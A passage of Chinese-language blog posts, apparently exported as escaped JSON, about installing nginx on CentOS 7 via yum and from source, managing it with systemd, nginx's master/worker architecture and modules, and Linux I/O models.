\u0026lt;sig\u0026gt; use sigqueue(2) rather than kill(2) Jul 20 17:43:12 centos7 sh[2333]: -p, --pid print pids without signaling them Jul 20 17:43:12 centos7 sh[2333]: -l, --list [=\u0026lt;signal\u0026gt;] list signal names, or convert one to a name Jul 20 17:43:12 centos7 sh[2333]: -L, --table list signal names and numbers Jul 20 17:43:12 centos7 sh[2333]: -h, --help display this help and exit Jul 20 17:43:12 centos7 sh[2333]: -V, --version output version information and exit Jul 20 17:43:12 centos7 sh[2333]: For more details see kill(1). Jul 20 17:43:12 centos7 systemd[1]: Unit nginx.service entered failed state. Jul 20 17:43:12 centos7 systemd[1]: nginx.service failed. [root@centos7 ~]# systemctl stop nginx #使用systemctl 关闭nginx [root@centos7 ~]# systemctl status nginx ● nginx.service - nginx - high performance web server Loaded: loaded (/usr/lib/systemd/system/nginx.service; enabled; vendor preset: disabled) Active: inactive (dead) since Wed 2022-07-20 17:47:47 CST; 1min 28s ago Docs: http://nginx.org/en/docs/ Process: 2378 ExecStop=/bin/sh -c /bin/kill -s TERM $(/bin/cat /var/run/nginx.pid) (code=exited, status=0/SUCCESS) Process: 2361 ExecStart=/usr/sbin/nginx -c /etc/nginx/nginx.conf (code=exited, status=0/SUCCESS) Main PID: 2362 (code=exited, status=0/SUCCESS) Jul 20 17:43:51 centos7 systemd[1]: Starting nginx - high performance web server... Jul 20 17:43:51 centos7 systemd[1]: Can\u0026#39;t open PID file /var/run/nginx.pid (yet?) after start: No such file or directory Jul 20 17:43:51 centos7 systemd[1]: Started nginx - high performance web server. Jul 20 17:47:47 centos7 systemd[1]: Stopping nginx - high performance web server... Jul 20 17:47:47 centos7 systemd[1]: Stopped nginx - high performance web server. [root@centos7 ~]# nginx #启动nginx [root@centos7 ~]# ps -ef|grep nginx #查看nginx进程已启动 root 2403 1 0 17:49 ? 00:00:00 nginx: master process nginx nginx 2404 2403 0 17:49 ? 00:00:00 nginx: worker process root 2407 2204 0 17:49 pts/1 00:00:00 grep --color=auto nginx [root@centos7 ~]# systemctl stop nginx #使用systemctl停止nginx [root@centos7 ~]# ps -ef|grep nginx #发现并未成功停止nginx进程 root 2403 1 0 17:49 ? 00:00:00 nginx: master process nginx nginx 2404 2403 0 17:49 ? 00:00:00 nginx: worker process root 2416 2204 0 17:49 pts/1 00:00:00 grep --color=auto nginx [root@centos7 ~]# systemctl status nginx #systemctl显示nginx进程并未启动 ● nginx.service - nginx - high performance web server Loaded: loaded (/usr/lib/systemd/system/nginx.service; enabled; vendor preset: disabled) Active: inactive (dead) since Wed 2022-07-20 17:47:47 CST; 2min 15s ago Docs: http://nginx.org/en/docs/ Process: 2378 ExecStop=/bin/sh -c /bin/kill -s TERM $(/bin/cat /var/run/nginx.pid) (code=exited, status=0/SUCCESS) Process: 2361 ExecStart=/usr/sbin/nginx -c /etc/nginx/nginx.conf (code=exited, status=0/SUCCESS) Main PID: 2362 (code=exited, status=0/SUCCESS) Jul 20 17:43:51 centos7 systemd[1]: Starting nginx - high performance web server... Jul 20 17:43:51 centos7 systemd[1]: Can\u0026#39;t open PID file /var/run/nginx.pid (yet?) after start: No such file or directory Jul 20 17:43:51 centos7 systemd[1]: Started nginx - high performance web server. Jul 20 17:47:47 centos7 systemd[1]: Stopping nginx - high performance web server... Jul 20 17:47:47 centos7 systemd[1]: Stopped nginx - high performance web server. [root@centos7 ~]# curl localhost #访问nginx成功，nginx是正常运行状态 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Welcome to nginx!\u0026lt;/title\u0026gt; \u0026lt;style\u0026gt; html { color-scheme: light dark; } body { width: 35em; margin: 0 auto; font-family: Tahoma, Verdana, Arial, sans-serif; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Welcome to nginx!\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;If you see this page, the nginx web server is successfully installed and working. Further configuration is required.\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;For online documentation and support please refer to \u0026lt;a href=\u0026#34;http://nginx.org/\u0026#34;\u0026gt;nginx.org\u0026lt;/a\u0026gt;.\u0026lt;br/\u0026gt; Commercial support is available at \u0026lt;a href=\u0026#34;http://nginx.com/\u0026#34;\u0026gt;nginx.com\u0026lt;/a\u0026gt;.\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;\u0026lt;em\u0026gt;Thank you for using nginx.\u0026lt;/em\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; #原因分析 systemctl 使用service文件管理nginx进程。当执行systemctl start nginx时，会将nginx进程的pid记录并存放在指定路径下的pid文件中（具体由service文件定义）。当执行systemctl stop nginx时，通过pid文件向对应的nginx进程发送信号使nginx进程中止运行。如果并未通过执行systemctl start nginx启动nginx，那么systemctl stop nginx命令是无法关闭nginx进程的。因此上文执行nginx命令启动了nginx进程，是无法通过systemctl stop 关闭nginx进程的。 编译安装 nginx 编译器介绍\n源码安装需要提前准备标准的编译器，GCC的全称是（GNU Compiler collection），其有GNU开发，并以GPL即LGPL许可，是自由的类UNIX即苹果电脑Mac OS X操作系统的标准编译器，因为GCC原本只能处理C语言，所以原名为GNU C语言编译器，后来得到快速发展，可以处理C++,Fortran，pascal，objective\u0002C，java以及Ada等其他语言，此外还需要Automake工具，以完成自动创建Makefile的工作，Nginx的一些模块需要依赖第三方库，比如: pcre（支持rewrite），zlib（支持gzip模块）和openssl（支持ssl模块）等。 使用官方源编译安装 官方源码包地址：https://nginx.org/en/download.html\n范例：编译安装nginx\n[root@centos7 ~]#yum -y install gcc pcre-devel openssl-devel zlib-devel #安装工具包和依赖 [root@centos7 ~]#useradd -s /sbin/nologin nginx #添加nginx账号并配置不可登录 [root@centos7 ~]#cd /usr/local/src/ [root@centos7 src]#wget http://nginx.org/download/nginx-1.18.0.tar.gz #下载源码包 [root@centos7 src]#tar xf nginx-1.18.0.tar.gz [root@centos7 src]#cd nginx-1.18.0/ #配置编译参数并检查环境依赖（如上文提到的gcc，pcre等依赖未安装则会报错） [root@centos7 nginx-1.18.0]#./configure --prefix=/apps/nginx \\ --user=nginx \\ --group=nginx \\ --with-http_ssl_module \\ --with-http_v2_module \\ --with-http_realip_module \\ --with-http_stub_status_module \\ --with-http_gzip_static_module \\ --with-pcre \\ --with-stream \\ --with-stream_ssl_module \\ --with-stream_realip_module [root@centos7 nginx-1.18.0]#make \u0026amp;\u0026amp; make install [root@centos7 nginx-1.18.0]#chown -R nginx.nginx /apps/nginx nginx安装完成后，有四个主要目录\n[root@centos7 ~]# tree /apps/nginx/ /apps/nginx/ ├── conf │ ├── fastcgi.conf │ ├── fastcgi.conf.default │ ├── fastcgi_params │ ├── fastcgi_params.default │ ├── koi-utf │ ├── koi-win │ ├── mime.types │ ├── mime.types.default │ ├── nginx.conf │ ├── nginx.conf.default │ ├── scgi_params │ ├── scgi_params.default │ ├── uwsgi_params │ ├── uwsgi_params.default │ └── win-utf ├── html │ ├── 50x.html │ └── index.html ├── logs └── sbin └── nginx conf：保存nginx所有的配置文件，其中nginx.conf是nginx服务器的最核心最主要的配置文件，其他的.conf则是用来配置nginx相关的功能的，例如fastcgi功能使用的是fastcgi.conf和fastcgi_params两个文件，配置文件一般都有个模板配置文件，是文件名.default结尾，使用的时候将其复制为并将后缀default去掉即可。 html目录中保存了nginx服务器的web文件，但是可以更改为其他目录保存web文件,另外还有一个50x的web文件是默认的错误页面提示页面。 logs：用来保存nginx服务器的访问日志错误日志等日志，logs目录可以放在其他路径，比如/var/logs/nginx里面。 sbin：保存nginx二进制启动脚本，可以接受不同的参数以实现不同的功能。 验证版本及编译参数 [root@centos7 ~]# ls /apps/nginx/sbin/ #nginx二进制程序路径 nginx [root@centos7 ~]# ln -s /apps/nginx/sbin/nginx /usr/sbin/ #创建软链接到PATH路径 ln: failed to create symbolic link ‘/usr/sbin/nginx’: File exists #注意之前yum安装nginx已生成该文件，因此软连接创建失败 [root@centos7 ~]# nginx -v #查看到的是yum安装的版本 nginx version: nginx/1.22.0 #使用绝对路径查看源码安装的nginx版本（如果要使用相对路径，可自行配置环境变量PATH） [root@centos7 ~]# /apps/nginx/sbin/nginx -v nginx version: nginx/1.18.0 [root@centos7 ~]# /apps/nginx/sbin/nginx -V nginx version: nginx/1.18.0 built by gcc 4.8.5 20150623 (Red Hat 4.8.5-44) (GCC) built with OpenSSL 1.0.2k-fips 26 Jan 2017 TLS SNI support enabled configure arguments: --prefix=/apps/nginx --user=nginx --group=nginx --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcre --with-stream --with-stream_ssl_module --with-stream_realip_module [root@centos7 ~]# echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin #重新创建软连接到PATH变量指向的路径下（越靠左，优先级越高） [root@centos7 ~]# ln -s /apps/nginx/sbin/nginx /usr/local/sbin/ [root@centos7 ~]# exec bash #重新加载bash程序（目的是删除上文执行nginx命令后生成的缓存） [root@centos7 ~]# nginx -v #观察到已经是源码安装的nginx版本 nginx version: nginx/1.18.0 验证安装结果 [root@centos7 ~]# nginx #启动nginx [root@centos7 ~]# ps -ef|grep nginx #进程已启动 root 5692 1 0 19:08 ? 00:00:00 nginx: master process nginx nginx 5693 5692 0 19:08 ? 00:00:00 nginx: worker process root 5695 2204 0 19:08 pts/1 00:00:00 grep --color=auto nginx [root@centos7 ~]# curl localhost #访问测试 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Welcome to nginx!\u0026lt;/title\u0026gt; \u0026lt;style\u0026gt; body { width: 35em; margin: 0 auto; font-family: Tahoma, Verdana, Arial, sans-serif; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Welcome to nginx!\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;If you see this page, the nginx web server is successfully installed and working. Further configuration is required.\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;For online documentation and support please refer to \u0026lt;a href=\u0026#34;http://nginx.org/\u0026#34;\u0026gt;nginx.org\u0026lt;/a\u0026gt;.\u0026lt;br/\u0026gt; Commercial support is available at \u0026lt;a href=\u0026#34;http://nginx.com/\u0026#34;\u0026gt;nginx.com\u0026lt;/a\u0026gt;.\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;\u0026lt;em\u0026gt;Thank you for using nginx.\u0026lt;/em\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; #关闭nginx [root@centos7 ~]# nginx -s stop [root@centos7 ~]# ps -ef|grep nginx root 5701 2204 0 19:10 pts/1 00:00:00 grep --color=auto nginx 创建nginx的service文件以实现开机自启动 #注意ExecStart和ExecReload的路径要和实际安装路径匹配 [root@centos7 ~]# cat \u0026gt; /usr/lib/systemd/system/nginx.service \u0026lt;\u0026lt;EOF [Unit] Description=nginx - high performance web server Documentation=http://nginx.org/en/docs/ After=network-online.target remote-fs.target nss-lookup.target Wants=network-online.target [Service] Type=forking PIDFile=/apps/nginx/run/nginx.pid ExecStart=/apps/nginx/sbin/nginx -c /apps/nginx/conf/nginx.conf ExecReload=/bin/kill -s HUP \\$MAINPID ExecStop=/bin/kill -s TERM \\$MAINPID [Install] WantedBy=multi-user.target EOF #创建缺少的目录 [root@centos7 ~]# mkdir /apps/nginx/run #修改pid文件指向的路径 [root@centos7 ~]# cat /apps/nginx/conf/nginx.conf | grep pid pid run/nginx.pid; #重新加载service文件配置 [root@centos7 ~]# systemctl daemon-reload #成功使用service文件管理nginx进程 [root@centos7 ~]# systemctl start nginx [root@centos7 ~]# systemctl status nginx ● nginx.service - nginx - high performance web server Loaded: loaded (/usr/lib/systemd/system/nginx.service; enabled; vendor preset: disabled) Active: active (running) since Wed 2022-07-20 19:22:30 CST; 1min 10s ago Docs: http://nginx.org/en/docs/ Main PID: 5769 (nginx) CGroup: /system.slice/nginx.service ├─5769 nginx: master process /usr/sbin/nginx -c /etc/nginx/nginx.conf └─5770 nginx: worker process Jul 20 19:22:30 centos7 systemd[1]: Starting nginx - high performance web server... Jul 20 19:22:30 centos7 systemd[1]: Can\u0026#39;t open PID file /var/run/nginx.pid (yet?) after start: No such file or directory #此报错可能是nginx自身的bug造成的，服务本身正常。 Jul 20 19:22:30 centos7 systemd[1]: Started nginx - high performance web server. nginx服务正常，但查看状态报错：Can\u0026rsquo;t open PID file /var/run/nginx.pid (yet?) after start: No such file or directory\n参考链接：https://blog.csdn.net/XY0918ZWQ/article/details/114165979\n","permalink":"https://senmer.github.io/zh/posts/tech/nginx/nginx%E5%AE%89%E8%A3%85/","summary":"\u003cp\u003e编译安装nginx和yum安装Nginx\u003c/p\u003e","title":"Nginx安装"},{"content":"Nginx基础架构和功能简介\nNginx架构 Nginx 概述 Nginx 介绍 **Nginx：**engine X ，2002年开发，分为社区版和商业版(nginx plus )\n2019年3月11日 F5 Networks 6.7亿美元的价格收购\nNginx是免费的、开源的、高性能的HTTP和反向代理服务器、邮件代理服务器、以及TCP/UDP代理服务器解决了C10K问题（10K Connections），参考链接: http://www.ideawu.net/blog/archives/740.html\n**Nginx官网：**http://nginx.org （社区版），https://www.nginx.com/（商业版）\nnginx的其它的二次发行版：\n**Tengine：**由淘宝网发起的Web服务器项目。它在Nginx的基础上，针对大访问量网站的需求，添加了很多高级功能和特性。Tengine的性能和稳定性已经在大型的网站如淘宝网，天猫商城等得到了很好的检验。它的最终目标是打造一个高效、稳定、安全、易用的Web平台。从2011年12月开始，Tengine成为一个开源项目，官网: http://tengine.taobao.org/\n**OpenResty：**基于 Nginx 与 Lua 语言的高性能 Web 平台， 章亦春团队开发，官网：http://openresty.org/cn/\nNginx 功能介绍 静态的web资源服务器，如 html，图片，js，css，txt 等静态资源 基于http/https协议的反向代理（七层） 结合FastCGI/uWSGI/SCGI等协议反向代理动态资源请求 基于tcp/udp协议反向代理（四层） imap4/pop3协议的反向代理（邮件服务器） Nginx 基础特性 模块化设计，较好的扩展性 高可靠性 支持热部署：不停机更新配置文件，升级版本，更换日志文件 低内存消耗：10000个keep-alive连接模式下的非活动连接，仅需2.5M内存 支持多种IO模型和零拷贝技术：event-driven, aio, mmap，sendfile Web 服务相关的功能 虚拟主机（server） 支持 keep-alive 和管道连接(利用一个连接做多次请求) 访问日志（支持基于日志缓冲提高其性能） url rewirte 路径别名 基于IP及用户的访问控制 支持速率限制及并发数限制 重新配置和在线升级而无须中断客户的工作进程 Nginx 架构和进程 Nginx 架构 Nginx 进程结构 web请求处理机制\n多进程方式：服务器每接收到一个客户端请求就有服务器的主进程生成一个子进程响应客户端，直到用户关闭连接，这样的优势是处理速度快，子进程之间相互独立，但是如果访问过大会导致服务器资源耗尽而无法提供请求。 多线程方式：与多进程方式类似，但是每收到一个客户端请求会有服务进程派生出一个线程来个客户方进行交互，一个线程的开销远远小于一个进程，因此多线程方式在很大程度减轻了web服务器对系统资源的要求，但是多线程也有自己的缺点，即当多个线程位于同一个进程内工作的时候，可以相互访问同样的内存地址空间，所以他们相互影响，一旦主进程挂掉则所有子线程都不能工作了，IIS服务器使用了多线程的方式，需要间隔一段时间就重启一次才能稳定。 Nginx是多进程组织模型，而且是一个由Master主进程和Worker工作进程组成。\n主进程(master process)的功能：\n对外接口：接收外部的操作（信号） 对内转发：根据外部的操作的不同，通过信号管理 Worker 监控：监控 worker 进程的运行状态，worker 进程异常终止后，自动重启 worker 进程 读取Nginx 配置文件并验证其有效性和正确性 建立、绑定和关闭socket连接 按照配置生成、管理和结束工作进程 接受外界指令，比如重启、升级及退出服务器等指令 不中断服务，实现平滑升级，重启服务并应用新的配置 开启日志文件，获取文件描述符 不中断服务，实现平滑升级，升级失败进行回滚处理 编译和处理perl脚本 工作进程（worker process）的功能：\n所有 Worker 进程都是平等的 实际处理：网络请求，由 Worker 进程处理 Worker进程数量：一般设置为核心数，充分利用CPU资源，同时避免进程数量过多，导致进程竞争CPU资源，增加上下文切换的损耗 接受处理客户的请求, 将请求依次送入各个功能模块进行处理 I/O调用，获取响应数据 与后端服务器通信，接收后端服务器的处理结果 缓存数据，访问缓存索引，查询和调用缓存数据 发送请求结果，响应客户的请求 接收主程序指令，比如重启、升级和退出等 Nginx 工作流程\nNginx 进程间通信 工作进程是由主进程生成的，主进程使用fork()函数，在Nginx服务器启动过程中主进程根据配置文件决定启动工作进程的数量，然后建立一张全局的工作表用于存放当前未退出的所有的工作进程，主进程生成工作进程后会将新生成的工作进程加入到工作进程表中，并建立一个单向的管道并将其传递给工作进程，该管道与普通的管道不同，它是由主进程指向工作进程的单向通道，包含了主进程向工作进程发出的指令、工作进程ID、工作进程在工作进程表中的索引和必要的文件描述符等信息。主进程与外界通过信号机制进行通信，当接收到需要处理的信号时，它通过管道向相关的工作进程发送正确的指令，每个工作进程都有能力捕获管道中的可读事件，当管道中有可读事件的时候，工作进程就会从管道中读取并解析指令，然后采取相应的执行动作，这样就完成了主进程与工作进程的交互。\nworker进程之间的通信原理基本上和主进程与worker进程之间的通信是一样的，只要worker进程之间能够取得彼此的信息，建立管道即可通信，但是由于worker进程之间是完全隔离的，因此一个进程想要知道另外一个进程的状态信息,就只能通过主进程来实现。 为了实现worker进程之间的交互，master进程在生成worker进程之后，在worker进程表中进行遍历，将该新进程的PID以及针对该进程建立的管道句柄传递给worker进程中的其他进程，为worker进程之间的通信做准备，当worker进程1向worker进程2发送指令的时候，首先在master进程给它的其他worker进程工作信息中找到2的进程PID，然后将正确的指令写入指向进程2的管道，worker进程2捕获到管道中的事件后，解析指令并进行相关操作，这样就完成了worker进程之间的通信。 此外worker进程可以通过共享内存来通讯，比如upstream中的zone，或者limit_req、limit_conn中的zone等。操作系统提供了共享内存机制。 Nginx 启动和HTTP连接建立 Nginx 启动时，Master 进程，加载配置文件 Master 进程，初始化监听的 socket Master 进程，fork 出多个 Worker 进程 Worker 进程，竞争新的连接，获胜方通过三次握手，建立 Socket 连接，并处理请求 HTTP 请求处理流程 Nginx 模块介绍 nginx 有多种模块\n核心模块：是 Nginx 服务器正常运行必不可少的模块，提供错误日志记录 、配置文件解析 、事件\n驱动机制 、进程管理等核心功能\n标准HTTP模块：提供 HTTP 协议解析相关的功能，比如： 端口配置 、 网页编码设置 、 HTTP响应\n头设置 等等\n可选HTTP模块：主要用于扩展标准的 HTTP 功能，让 Nginx 能处理一些特殊的服务，比如： Flash\n多媒体传输 、解析 GeoIP 请求、 网络传输压缩 、 安全协议 SSL 支持等\n邮件服务模块：主要用于支持 Nginx 的 邮件服务 ，包括对 POP3 协议、 IMAP 协议和 SMTP协议\n的支持\nStream服务模块: 实现反向代理功能,包括TCP协议代理\n第三方模块：是为了扩展 Nginx 服务器应用，完成开发者自定义功能，比如： Json 支持、 Lua 支\n持等\nnginx高度模块化，但其模块早期不支持DSO机制;1.9.11 版本支持动态装载和卸载\n模块分类：\n核心模块：core module 标准模块： HTTP 模块：ngx_http_* HTTP Core modules #默认功能 HTTP Optional modules #需编译时指定 Mail 模块: ngx_mail_* Stream 模块 ngx_stream_* 第三方模块 ","permalink":"https://senmer.github.io/zh/posts/tech/nginx/nginx%E6%9E%B6%E6%9E%84%E7%AE%80%E4%BB%8B/","summary":"\u003cp\u003eNginx基础架构和功能简介\u003c/p\u003e","title":"Nginx架构简介"},{"content":"本节内容主要用于理解Linux的I/O模型，以便更好地理解Nginx架构。\nI/O的定义 I/O在计算机中指Input/Output， IOPS (Input/Output Per Second)即每秒的输入输出量(或读写次数)，是衡量磁盘性能的主要指标之一。IOPS是指单位时间内系统能处理的I/O请求数量，一般以每秒处理的I/O请求数量为单位，I/O请求通常为读或写数据操作请求。\n一次完整的I/O是用户空间的进程数据与内核空间的内核数据的报文的完整交换，但是由于内核空间与用户空间是严格隔离的，所以其数据交换过程中不能由用户空间的进程直接调用内核空间的内存数据，而是需要经历一次从内核空间中的内存数据copy到用户空间的进程内存当中，所以简单说I/O就是把数据从内核空间中的内存数据复制到用户空间中进程的内存当中。\nLinux 的 I/O 磁盘I/O 网络I/O : 一切皆文件,本质为对socket文件的读写 磁盘 I/O 磁盘I/O是进程向内核发起系统调用，请求磁盘上的某个资源比如是html 文件或者图片，然后内核通过相应的驱动程序将目标文件加载到内核的内存空间，加载完成之后把数据从内核内存（内核空间）再复制给进程内存（用户空间），如果是比较大的数据也需要等待一定时间。\n机械磁盘的寻道时间、旋转延迟和数据传输时间： 寻道时间：是指磁头移动到正确的磁道上所花费的时间，寻道时间越短则I/O处理就越快，目前磁盘的寻道时间一般在3-15毫秒左 右。 旋转延迟：是指将磁盘片旋转到数据所在的扇区到磁头下面所花费的时间，旋转延迟取决于磁盘的转速，通常使用磁盘旋转一周所 需要时间的1/2之一表示，比如7200转的磁盘平均训传延迟大约为60*1000/7200/2=4.17毫秒，公式的意思为 （每分钟60秒*1000毫秒每秒/7200转每分/2），如果是15000转的则为60*1000/15000/2=2毫秒。 数据传输时间：指的是读取到数据后传输数据的时间，主要取决于传输速率，这个值等于数据大小除以传输速率，目前的磁盘接口 每秒的传输速度可以达到600MB，因此可以忽略不计。 常见的机械磁盘平均寻道时间值： 7200转/分的磁盘平均物理寻道时间：9毫秒 10000转/分的磁盘平均物理寻道时间：6毫秒 15000转/分的磁盘平均物理寻道时间：4毫秒 常见磁盘的平均延迟时间： 7200转的机械盘平均延迟：60*1000/7200/2 = 4.17ms 10000转的机械盘平均延迟：60*1000/10000/2 = 3ms 15000转的机械盘平均延迟：60*1000/15000/2 = 2ms 每秒最大IOPS的计算方法： 7200转的磁盘IOPS计算方式：1000毫秒/(9毫秒的寻道时间+4.17毫秒的平均旋转延迟时间)=1000/13.13=75.9 IOPS 10000转的磁盘的IOPS计算方式：1000毫秒/(6毫秒的寻道时间+3毫秒的平均旋转延迟时间)=1000/9=111IOPS 15000转的磁盘的IOPS计算方式：15000毫秒/(4毫秒的寻道时间+2毫秒的平均旋转延迟时间)=1000/6=166.6 IOPS 网络 I/O 网络协议栈到用户空间进程的IO就是网络IO\n网络I/O处理过程\n获取请求数据，客户端与服务器建立连接发出请求，服务器接受请求（1-3） 构建响应，当服务器接收完请求，并在用户空间处理客户端的请求，直到构建响应完成（4） 返回数据，服务器将已构建好的响应再通过内核空间的网络 I/O 返回给客户端（5-7） 每次I/O都要经历的两个阶段\n第一步：将数据从文件先加载至内核内存空间（缓冲区），等待数据准备完成，时间较长（网络数据拷贝） 第二步：将数据从内核缓冲区复制到用户空间的进程的内存中，时间较短（内存数据拷贝） I/O 模型 I/O模型相关概念 同步/异步：关注的是消息通信机制，即调用者在等待一件事情的处理结果时，被调用者是否提供完成状态的通知。\n同步：synchronous，被调用者并不提供事件的处理结果相关的通知消息，需要调用者主动询问事情是否处理完成 异步：asynchronous，被调用者通过状态、通知或回调机制主动通知调用者被调用者的运行状态 阻塞/非阻塞：关注调用者在等待结果返回之前所处的状态\n阻塞：blocking，指IO操作需要彻底完成后才返回到用户空间，调用结果返回之前，调用者被挂起，干不了别的事情。 非阻塞：nonblocking，指IO操作被调用后立即返回给用户一个状态值，而无需等到IO操作彻底完成，在最终的调用结果返回之前，调用者不会被挂起，可以去做别的事情。 网络 I/O 模型 阻塞型、非阻塞型、复用型、信号驱动型、异步\n阻塞型 I/O 模型（blocking IO） 阻塞IO模型是最简单的I/O模型，用户线程在内核进行IO操作时被阻塞。\n用户线程通过系统调用read发起I/O读操作，由用户空间转到内核空间。内核等到数据包到达后，然后将接收的数据拷贝到用户空间，完成read操作。\n用户需要等待read将数据读取到buffer后，才继续处理接收的数据。整个I/O请求的过程中，用户线程是被阻塞的，这导致用户在发起IO请求时，不能做任何事情，对CPU的资源利用率不够。\n优点：程序简单，在阻塞等待数据期间进程/线程挂起，基本不会占用 CPU 资源。\n缺点：每个连接需要独立的进程/线程单独处理，当并发请求量大时为了维护程序，内存、线程切换开销较大。\n同步阻塞：程序向内核发送I/O请求后一直等待内核响应，如果内核处理请求的IO操作不能立即返回, 则进程将一直等待并不再接受新的请求，并由进程轮询查看I/O是否完成，完成后进程将I/O结果返回给Client，在IO没有返回期间进程不能接受其他客户的请求，而且是由进程自己去查看I/O是否完成，这种方式简单，但是比较慢，用的比较少。 非阻塞 I/O 模型（nonblocking IO） 用户线程发起IO请求时立即返回。但并未读取到任何数据，用户线程需要不断地发起IO请求，直到数据到达后，才真正读取到数据，继续执行。即 “轮询”机制存在两个问题：如果有大量文件描述符都要等，那么就得一个一个read。这会带来大量的Context Switch（read是系统调用，每调用一次就得在用户态和核心态切换一次）。轮询的时间不好把握。这里需要估计数据需要多久之后才能准备好。等待时间设的太长，程序响应延迟就过大; 设的太短，就会造成过于频繁的重试，干耗CPU而已，是比较浪费CPU的方式，一般很少直接使用这种模型，而是在其他IO模型中使用非阻塞IO这一特性。\n非阻塞：程序向内核发送请I/O求后一直等待内核响应，如果内核处理请求的IO操作不能立即返回IO结果，进程将不再等待，而是继续处理其他请求，但是仍然需要进程隔一段时间就要查看内核I/O是否完成。 由上图可知，在设置连接为非阻塞时，当应用进程系统调用 recvfrom 没有数据返回时，内核会立即返回一个 EWOULDBLOCK 错误，而不会一直阻塞到数据准备好。如上图在第四次调用时有一个数据报准备好了，所以这时数据会被复制到应用进程缓冲区 ，于是 recvfrom 成功返回数据。\n当一个应用进程这样循环调用 recvfrom 时，称之为轮询 polling 。这么做往往会耗费大量CPU时间，这种模型实际很少被使用。\n多路复用 I/O 模 型（ I/O multiplexing ） 上面的模型中, 每一个文件描述符对应的IO均由一个线程监控和处理（有多少文件描述符就要生成多少个线程）\n多路复用IO指一个线程可以同时（实际是交替实现，即并发完成）监控和处理多个文件描述符对应各自的IO，即复用同一个线程\n一个线程之所以能实现同时处理多个IO, 是因为这个线程调用了内核中的SELECT, POLL或EPOLL等系统调用，从而实现多路复用IO\nI/O multiplexing 主要包括:select，poll，epoll三种系统调用，select/poll/epoll的好处就在于单个process（进程）就可以同时处理多个网络连接的IO。\n它的基本原理就是select/poll/epoll这个function会不断的轮询所负责的所有socket，当某个socket有数据到达了，就通知用户进程。\n当用户进程调用了select，那么整个进程会被block，而同时，kernel会“监视”所有select负责的socket，当任何一个socket中的数据准备好了，select就会返回。这个时候用户进程再调用read操作，将数据从kernel拷贝到用户进程。\nIO多路复用（IO Multiplexing) ：是一种机制，程序注册一组socket文件描述符给操作系统，表示“我要监视这些fd是否有IO事件发生，有了就告诉程序处理”； IO多路复用一般和NIO（nonblocking IO）一起使用的。NIO和IO多路复用是相对独立的。NIO仅仅是指IO API总是能立刻返回，不会被Blocking; 而IO多路复用仅仅是操作系统提供的一种便利的通知机制。操作系统并不会强制这俩必须得一起用，可以只用IO多路复用 + BIO（blocking IO），这时还是当前线程被卡住。IO多路复用和NIO是要配合一起使用才有实际意义； IO多路复用是指内核一旦发现进程指定的一个或者多个IO条件准备就绪，就通知该进程； 多个连接共用一个等待机制，本模型会阻塞进程，但是进程是阻塞在select或者poll这两个系统调用上，而不是阻塞在真正的IO操作上； 用户首先将需要进行IO操作添加到select中，同时等待select系统调用返回。当数据到达时，IO被激活，select函数返回。用户线程正式发起read请求，读取数据并继续执行； 从流程上来看，使用select函数进行IO请求和同步阻塞模型没有太大的区别，甚至还多了添加监视IO，以及调用select函数的额外操作，效率更差。并且阻塞了两次，但是第一次阻塞在select上时，select可以监控多个IO上是否已有IO操作准备就绪，即可达到在同一个线程内同时处理多个IO请求的目的。而不像阻塞IO那种，一次只能监控一个IO； 虽然上述方式允许单线程内处理多个IO请求，但是每个IO请求的过程还是阻塞的（在select函数上阻塞），平均时间甚至比同步阻塞IO模型还要长。如果用户线程只是注册自己需要的IO请求，然后去做自己的事情，等到数据到来时再进行处理，则可以提高CPU的利用率； IO多路复用是最常使用的IO模型，但是其异步程度还不够“彻底”，因它使用了会阻塞线程的select系统调用。因此IO多路复用只能称为异步阻塞IO模型，而非真正的异步IO； 优缺点\n优点：可以基于一个阻塞对象，同时在多个描述符上等待就绪，而不是使用多个线程(每个文件描述符一个线程)，这样可以大大节省系统资源 缺点：当连接数较少时效率相比多线程+阻塞 I/O 模型效率较低，可能延迟更大，因为单个连接处理需要 2 次系统调用（select和recvfrom），占用时间会有增加 IO多路复用适用如下场合：\n当客户端处理多个描述符时（一般是交互式输入和网络套接口），必须使用I/O复用 当一个客户端同时处理多个套接字时，此情况可能的但很少出现 当一个服务器既要处理监听套接字，又要处理已连接套接字，一般也要用到I/O复用 当一个服务器即要处理TCP，又要处理UDP，一般要使用I/O复用 当一个服务器要处理多个服务或多个协议，一般要使用I/O复用 信号驱动式 I/O 模型（signal-driven IO） 信号驱动I/O的意思就是进程现在不用傻等着，也不用去轮询。而是让内核在数据就绪时，发送信号通知进程。\n调用的步骤是，通过系统调用 sigaction ，并注册一个信号处理的回调函数，该调用会立即返回，然后主程序可以继续向下执行，当有I/O操作准备就绪,即内核数据就绪时，内核会为该进程产生一个 SIGIO信号，并回调注册的信号回调函数，这样就可以在信号回调函数中系统调用 recvfrom 获取数据,将用户进程所需要的数据从内核空间拷贝到用户空间。此模型的优势在于等待数据报到达期间进程不被阻塞。用户主程序可以继续执行，只要等待来自信号处理函数的通知。\n在信号驱动式 I/O 模型中，应用程序使用套接口进行信号驱动 I/O，并注册一个信号处理函数，进程继续运行并不阻塞，当数据准备好时，进程会收到一个 SIGIO 信号，可以在信号处理函数中调用 I/O 操作函数处理数据。\n优点：线程并没有在等待数据时被阻塞，内核直接返回调用接收信号，不影响进程继续处理其他请求因此可以提高资源的利用率。\n缺点：信号 I/O 在大量 IO 